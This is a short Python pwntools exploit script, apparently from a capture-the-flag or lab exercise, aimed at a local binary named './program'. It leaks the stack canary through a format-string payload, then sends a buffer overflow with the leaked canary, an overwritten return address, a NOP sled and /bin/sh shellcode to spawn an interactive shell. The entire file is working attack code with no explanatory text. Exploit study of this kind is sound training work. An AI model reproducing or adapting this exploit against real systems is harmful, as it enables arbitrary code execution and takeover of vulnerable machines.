#!/usr/bin/env python
import pwn

# pwn.context.log_level = 'critical'

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"  # /bin/sh

elf = pwn.ELF('./program')

rip = 0x7fffffffe580 + 35
canary_cookie_offset = 27

p = elf.process()

payload_step1 = '%{}$lx'.format(canary_cookie_offset)

p.recvline()
p.sendline(payload_step1)

leak = p.recvline().strip()
canary_cookie_value = int(leak.split(' ')[1][:-1], 16)

pwn.log.info('Canary Cookie value: {}'.format(hex(canary_cookie_value)))

payload_step2 = ''
payload_step2 += 'A' * 168
payload_step2 += pwn.p64(canary_cookie_value)
payload_step2 += "JUNKJUNK"
payload_step2 += pwn.p64(rip)
payload_step2 += "\x90" * 100
payload_step2 += shellcode

open('payload.txt', 'w').write('{}\n{}'.format(
    payload_step1,
    payload_step2
))


p.sendline(payload_step2)
p.interactive()
